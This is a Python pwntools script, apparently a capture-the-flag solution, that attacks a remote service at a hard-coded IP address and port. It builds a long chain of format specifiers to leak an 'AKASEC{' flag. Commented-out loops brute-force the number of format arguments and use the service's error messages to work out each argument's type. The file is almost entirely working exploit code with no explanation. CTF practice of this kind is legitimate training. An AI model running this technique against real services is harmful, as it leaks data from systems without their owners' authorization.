from pwn import *
from collections import deque
context.log_level='critical'
args_len = -1
fmts = ["%s", "%r", "%d", "%f"]

# for i in range(1001, 799, -4):
#     print(i)
#     try:
#         maxIterations = (i - 1) // 4
#         lst = sum([[fmt]*maxIterations for fmt in fmts], [])

#         p = remote("20.80.240.190", 4213)
#         p.sendlineafter(b':', ''.join(lst))

#         res = p.recvline(b'Too many %s specifiers!')
#         p.close()
#         if b'Too many %s specifiers!' not in res:
#             args_len = i
#             break
#     except:
#         p.close()
#         args_len = i
#         break

args_len = 880 - 8 + 1
maxIterations = 218 #(args_len - 1) // 4

str_index = []

strs = deque(["%r"]*maxIterations + ["%s"]*(maxIterations+1))
non_strs = deque(["%f"]*maxIterations + ["%d"]*maxIterations)
lst = []

# load
# str_index = [8, 23, 24, 26, 28, 43, 46, 48, 54, 60, 62, 68, 70, 71, 74, 76, 77, 78, 85, 87, 89, 90, 93, 95, 96, 98, 107, 111, 112, 119, 126, 130, 133, 136, 139, 141, 142, 146, 154, 156, 160, 164, 175, 177, 179, 181, 184, 186, 187, 195, 198, 202, 206, 210, 213, 214, 218, 222, 230, 231, 233, 238, 240, 248, 256, 260, 265, 269, 273, 287, 292, 295, 299, 300, 305, 312, 313, 315, 316, 317, 321, 332, 343, 345, 351, 354, 358, 360, 363, 367, 372, 374, 384, 386, 387, 393, 395, 402, 403, 408, 419, 429, 435, 444, 447, 449, 455, 456, 459, 461, 472, 474, 481, 482, 488, 493, 494, 496, 501, 502, 507, 513, 515, 519, 521, 523, 524, 526, 527, 529, 531, 536, 540]

# for i in range(569):
#     try:
#         str_index.index(i)
#         lst += [strs.popleft()]
#     except:
#         lst += [non_strs.popleft()]

# context.log_level='debug'
# for i in range(len(lst), args_len):
#     print(i)
#     lst += ["%d"]
#     p = remote("20.80.240.190", 4213)

#     p.sendlineafter(b':', ''.join(lst))

#     p.recvuntil(b"~~~~~~~~~~~~~^~~~~~~~~~~~~\n")
#     res = p.recvline()
#     p.close()
#     if b', not str' in res:
#         lst[i] = strs.popleft()
#         str_index += [i]
#         print(str_index)
#     else:
#         lst[i] = non_strs.popleft()
#         if not non_strs:
#             non_strs.append(strs.popleft())
# 
# p.interactive()

payload = '%f%f%f%f%f%f%f%f%r%f%f%f%f%f%f%f%f%f%f%f%f%f%f%r%r%f%r%f%r%f%f%f%f%f%f%f%f%f%f%f%f%f%f%r%f%f%r%f%r%f%f%f%f%f%r%f%f%f%f%f%r%f%r%f%f%f%f%f%r%f%r%r%f%f%r%f%r%r%r%f%f%f%f%f%f%r%f%r%f%r%r%f%f%r%f%r%r%f%r%f%f%f%f%f%f%f%f%r%f%f%f%r%r%f%f%f%f%f%f%r%f%f%f%f%f%f%r%f%f%f%r%f%f%r%f%f%r%f%f%r%f%r%r%f%f%f%r%f%f%f%f%f%f%f%r%f%r%f%f%f%r%f%f%f%r%f%f%f%f%f%f%f%f%f%f%r%f%r%f%r%f%r%f%f%r%f%r%r%f%f%f%f%f%f%f%r%f%f%r%f%f%f%r%f%f%f%r%f%f%f%r%f%f%r%r%f%f%f%r%f%f%f%r%f%f%f%f%f%f%f%r%r%f%r%f%f%f%f%r%f%r%f%f%f%f%f%f%f%r%f%f%f%f%f%f%f%r%f%f%f%r%f%f%f%f%r%f%f%f%r%f%f%f%r%f%f%f%f%f%f%f%f%f%f%f%f%f%r%d%d%d%d%r%d%d%r%d%d%d%r%r%d%d%d%d%r%d%d%d%d%d%d%r%r%d%r%r%r%d%d%d%r%d%d%d%d%d%d%d%d%d%d%r%d%d%d%d%d%d%d%d%d%d%r%d%r%d%d%d%d%d%r%d%d%r%d%d%d%r%d%r%d%d%r%d%d%d%r%d%d%d%d%r%d%r%d%d%d%d%d%d%d%d%d%r%d%r%r%d%d%d%d%d%r%d%r%d%d%d%d%d%d%r%r%d%d%d%d%r%d%d%d%d%d%d%d%d%d%d%r%d%d%d%d%d%d%d%d%d%r%d%d%d%d%d%r%d%d%d%d%d%d%d%d%r%d%d%r%d%r%d%d%d%d%d%r%r%d%d%r%d%r%d%d%d%d%d%d%d%d%d%d%r%d%r%d%d%d%d%d%d%r%r%d%d%d%d%d%r%d%d%d%d%r%r%d%r%d%d%d%d%r%r%d%d%d%d%r%d%d%d%d%d%r%d%r%d%d%d%r%d%r%d%r%r%d%r%r%d%r%d%r%d%d%d%d%r%d%d%d%r%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d'
payload += "%r"*(218 - payload.count("%r")) + "%s"*219

p = remote("20.80.240.190", 4213)
p.sendlineafter(b':', payload.encode())
res = p.recvline()
p.close()

if b'AKASEC{' not in res:
    payload = payload.replace("%r", "%x").replace("%s", "%r").replace("%x", "%s")
    p = remote("20.80.240.190", 4213)
    p.sendlineafter(b':', payload.encode())
    res = p.recvline()
    p.close()

idx = res.index(b'AKASEC{')
print(res[idx:idx+100])